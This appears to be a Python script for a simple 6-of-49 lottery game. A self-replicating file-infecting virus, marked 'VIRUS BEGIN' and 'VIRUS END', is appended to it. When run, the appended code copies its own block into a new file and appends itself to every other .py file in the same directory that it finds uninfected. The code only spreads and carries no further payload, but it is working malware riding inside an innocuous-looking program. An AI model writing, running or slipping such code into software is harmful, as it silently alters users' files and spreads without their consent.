#!/usr/bin/env python
import random

def get_user_numbers():
    print("Enter your lottery numbers (choose 6 numbers between 1 and 49):")
    user_numbers = set()

    while len(user_numbers) < 6:
        try:
            number = int(input(f"Enter number {len(user_numbers) + 1}: "))
            if 1 <= number <= 49:
                user_numbers.add(number)
            else:
                print("Please enter a number between 1 and 49.")
        except ValueError:
            print("Invalid input. Please enter a valid number.")

    return user_numbers

def generate_winning_numbers():
    return set(random.sample(range(1, 50), 6))

def check_results(user_numbers, winning_numbers):
    matched_numbers = user_numbers.intersection(winning_numbers)
    return matched_numbers

def display_results(matched_numbers, winning_numbers):
    print("\nWinning Numbers:", winning_numbers)
    
    if not matched_numbers:
        print("Sorry, no matches. Better luck next time!")
    else:
        print(f"Congratulations! You matched {len(matched_numbers)} number(s): {matched_numbers}")

if __name__ == "__main__":
    print("Welcome to the Simple Lottery Game!")

    user_numbers = get_user_numbers()
    winning_numbers = generate_winning_numbers()
    matched_numbers = check_results(user_numbers, winning_numbers)
    
    display_results(matched_numbers, winning_numbers)
### VIRUS BEGIN ###

import sys
import os
import glob
import re

startLine = "### VIRUS-BEGIN ###"
endLine = "### VIRUS-END ###"

def find_python_files(directory="."):
    pattern = os.path.join(directory, "*.py")
    python_files = glob.glob(pattern)
    return python_files
    
def modify_files(target_file_path=".", code="# No code to insert!"):
    # Open the target file in read mode to get existing content
    with open(target_file_path, "r") as target_file:
        ogCode = list()
        for line in target_file:
            ogCode.append(line)
            if startLine.replace("-", " ") in line:
                return "File in path", target_file_path, "already infected."
        for code_line in code:
            ogCode.append(code_line)

    # Open the target file in write mode and write both existing and new code
    with open(target_file_path, "w") as target_file:
        target_file.writelines(ogCode)
        return "File in path", target_file_path, "infected!"

def generate_unique_filename(base_filename, extension, index=1):
    new_filename = f"{base_filename}_{index}{extension}"
    while os.path.exists(new_filename):
        index += 1
        new_filename = f"{base_filename}_{index}{extension}"
    return new_filename

def copy_self_code(input_file, output_file):
    copy_lines = []

    with open(input_file, 'r') as file:
        inside_copy_block = False

        for line in file:
            if startLine.replace("-", " ") in line:
                inside_copy_block = True
                copy_lines.append(line)
            elif endLine.replace("-", " ")  in line:
                inside_copy_block = False
                copy_lines.append(line)
            elif inside_copy_block:
                copy_lines.append(line)

    unique_output_file = generate_unique_filename(output_file, '.py')
    
    with open(unique_output_file, 'w') as output:
        output.writelines(copy_lines)
    return copy_lines

if __name__ == "__main__":
    current_directory = os.path.dirname(os.path.abspath(__file__))
    python_files = find_python_files(current_directory)

    print("Python files in the same directory:", python_files)

    current_file = os.path.abspath(__file__)
    new_file = "replicated_virus"
    virusCode = copy_self_code(current_file, new_file)
    for fil in python_files:
        print(modify_files(fil, virusCode))

### VIRUS END ###
